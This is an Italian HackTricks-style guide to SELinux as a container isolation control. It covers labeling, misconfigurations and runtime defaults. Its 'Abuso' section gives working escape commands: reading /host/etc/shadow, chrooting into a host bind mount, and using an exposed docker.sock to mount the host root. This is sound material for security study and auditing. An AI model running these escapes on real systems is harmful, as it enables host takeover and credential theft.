# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Panoramica

SELinux è un sistema di Controllo d'Accesso Obbligatorio (Mandatory Access Control) basato su etichette. Ogni processo e oggetto rilevante può portare un contesto di sicurezza, e la policy decide quali domini possono interagire con quali tipi e in che modo. Negli ambienti containerizzati, questo di solito significa che il runtime avvia il processo del container sotto un dominio container confinato ed etichetta il contenuto del container con i tipi corrispondenti. Se la policy funziona correttamente, il processo potrà leggere e scrivere le risorse che la sua etichetta dovrebbe toccare mentre gli sarà negato l'accesso ad altri contenuti dell'host, anche se tali contenuti diventano visibili tramite un mount.

Questa è una delle protezioni lato host più potenti disponibili nelle implementazioni container Linux mainstream. È particolarmente importante su Fedora, RHEL, CentOS Stream, OpenShift e altri ecosistemi centrati su SELinux. In quegli ambienti, un revisore che ignora SELinux spesso fraintenderà perché una via apparentemente ovvia per compromettere l'host sia in realtà bloccata.

## AppArmor Vs SELinux

La differenza a alto livello più semplice è che AppArmor è basato sui percorsi mentre SELinux è **basato su etichette**. Questo ha grandi conseguenze per la sicurezza dei container. Una policy basata sui percorsi può comportarsi diversamente se lo stesso contenuto dell'host diventa visibile sotto un percorso di mount inatteso. Una policy basata su etichette invece si chiede quale sia l'etichetta dell'oggetto e cosa il dominio del processo può fare su di essa. Questo non rende SELinux semplice, ma lo rende robusto rispetto a una classe di assunzioni basate su trucchi sui percorsi che i difensori a volte compiono accidentalmente nei sistemi basati su AppArmor.

Poiché il modello è orientato alle etichette, la gestione dei volumi dei container e le decisioni di rilabeling sono critiche per la sicurezza. Se il runtime o l'operatore modificano le etichette in modo troppo ampio per "far funzionare i mount", il confine della policy che doveva contenere il workload può diventare molto più debole del previsto.

## Lab

Per verificare se SELinux è attivo sull'host:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Per ispezionare le etichette esistenti sull'host:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Per confrontare un'esecuzione normale con una in cui l'etichettatura è disabilitata:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
Su un host abilitato a SELinux, questa è una dimostrazione molto pratica perché mostra la differenza tra un carico di lavoro che gira nel dominio del container previsto e uno che è stato privato di quel livello di enforcement.

## Uso a runtime

Podman è particolarmente ben integrato con SELinux sui sistemi in cui SELinux è parte delle impostazioni di default della piattaforma. Rootless Podman insieme a SELinux costituisce una delle baseline per container più robuste, perché il processo è già non privilegiato sul lato host e rimane confinato dalla MAC policy. Docker può usare SELinux dove è supportato, anche se gli amministratori a volte lo disabilitano per aggirare problemi di labeling dei volumi. CRI-O e OpenShift fanno ampio uso di SELinux come parte della loro strategia di isolamento dei container. Kubernetes può esporre impostazioni correlate a SELinux, ma il loro valore dipende ovviamente dal fatto che il sistema operativo del nodo supporti e applichi effettivamente SELinux.

La lezione ricorrente è che SELinux non è un condimento opzionale. Negli ecosistemi costruiti intorno a esso, fa parte del perimetro di sicurezza previsto.

## Configurazioni errate

Il classico errore è `label=disable`. Operativamente, questo capita spesso perché un mount di un volume viene negato e la soluzione rapida a breve termine è stata rimuovere SELinux dall'equazione invece di correggere il modello di labeling. Un altro errore comune è il relabeling errato del contenuto host. Operazioni di relabeling ampie possono far funzionare l'applicazione, ma possono anche estendere ciò che il container è autorizzato a toccare ben oltre quanto originariamente previsto.

È inoltre importante non confondere SELinux **installato** con SELinux **effettivo**. Un host può supportare SELinux ma essere comunque in modalità permissiva, oppure il runtime potrebbe non avviare il workload nel dominio previsto. In questi casi la protezione è molto più debole di quanto la documentazione possa suggerire.

## Abuso

Quando SELinux è assente, in modalità permissiva, o ampiamente disabilitato per il workload, i percorsi montati dell'host diventano molto più facili da sfruttare. Lo stesso bind mount che altrimenti sarebbe stato vincolato dalle label può diventare una via diretta ai dati dell'host o a modifiche dell'host. Ciò è particolarmente rilevante se combinato con mount di volumi scrivibili, directory del runtime del container, o scorciatoie operative che espongono percorsi sensibili dell'host per comodità.

SELinux spiega spesso perché una writeup di breakout generico funzioni immediatamente su un host ma fallisca ripetutamente su un altro, anche se i flag del runtime sembrano simili. L'ingrediente mancante non è di frequente un namespace o una capability, ma un confine di label che è rimasto intatto.

Il controllo pratico più veloce è confrontare il contesto attivo e poi sondare i percorsi montati dell'host o le directory del runtime che normalmente sarebbero confinate dalle label:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
Se è presente un host bind mount e il labeling di SELinux è stato disabilitato o indebolito, spesso la divulgazione di informazioni avviene per prima:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
Se il mount è writable e il container è effettivamente host-root dal punto di vista del kernel, il passo successivo è testare una modifica controllata dell'host piuttosto che indovinare:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
Su host con SELinux abilitato, la perdita delle etichette nelle directory di stato runtime può anche esporre percorsi diretti di privilege-escalation:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Questi comandi non sostituiscono una full escape chain, ma chiariscono molto rapidamente se SELinux stava impedendo l'accesso ai dati dell'host o la modifica dei file sul host.

### Esempio completo: SELinux disabilitato + mount host scrivibile

Se SELinux labeling è disabilitato e il filesystem dell'host è montato in scrittura su `/host`, una full host escape diventa un normale caso di bind-mount abuse:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Se il `chroot` riesce, il container process sta ora operando dal host filesystem:
```bash
id
hostname
cat /etc/passwd | tail
```
### Esempio completo: SELinux disabilitato + Runtime Directory

Se il workload può raggiungere una socket del runtime una volta che le etichette sono disabilitate, l'escape può essere delegato al runtime:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
L'osservazione rilevante è che SELinux spesso era il controllo che impediva proprio questo tipo di accesso a host-path o runtime-state.

## Controlli

L'obiettivo dei controlli SELinux è confermare che SELinux sia abilitato, identificare il contesto di sicurezza corrente e verificare se i file o i percorsi di tuo interesse siano effettivamente label-confined.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
Quello che è interessante qui:

- `getenforce` dovrebbe idealmente restituire `Enforcing`; `Permissive` o `Disabled` cambia il significato dell'intera sezione SELinux.
- Se il contesto del processo corrente sembra inaspettato o troppo ampio, il carico di lavoro potrebbe non essere eseguito sotto la policy container prevista.
- Se i file montati dall'host o le directory runtime hanno etichette a cui il processo può accedere troppo liberamente, i bind mounts diventano molto più pericolosi.

Quando si revisiona un container su una piattaforma con SELinux abilitato, non considerare l'etichettatura un dettaglio secondario. In molti casi è uno dei motivi principali per cui l'host non è già compromesso.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Dipendente dall'host | La separazione SELinux è disponibile sugli host con SELinux abilitato, ma il comportamento esatto dipende dalla configurazione dell'host/daemon | `--security-opt label=disable`, rilabeling esteso dei bind mounts, `--privileged` |
| Podman | Comunemente abilitato sugli host SELinux | La separazione SELinux è una parte normale di Podman sui sistemi SELinux, a meno che non sia disabilitata | `--security-opt label=disable`, `label=false` in `containers.conf`, `--privileged` |
| Kubernetes | Non generalmente assegnato automaticamente a livello di Pod | Il supporto SELinux esiste, ma i Pod di solito necessitano di `securityContext.seLinuxOptions` o di impostazioni predefinite specifiche della piattaforma; sono richiesti supporto runtime e del nodo | valori `seLinuxOptions` deboli o troppo generici, esecuzione su nodi permissive/disabled, policy di piattaforma che disabilitano l'etichettatura |
| CRI-O / OpenShift style deployments | Spesso fortemente utilizzato | SELinux è spesso una parte centrale del modello di isolamento del nodo in questi ambienti | policy personalizzate che ampliano eccessivamente gli accessi, disabilitazione dell'etichettatura per compatibilità |

I default di SELinux dipendono più dalla distribuzione rispetto ai default di seccomp. Su sistemi in stile Fedora/RHEL/OpenShift, SELinux è spesso centrale nel modello di isolamento. Su sistemi non-SELinux, è semplicemente assente.
{{#include ../../../../banners/hacktricks-training.md}}
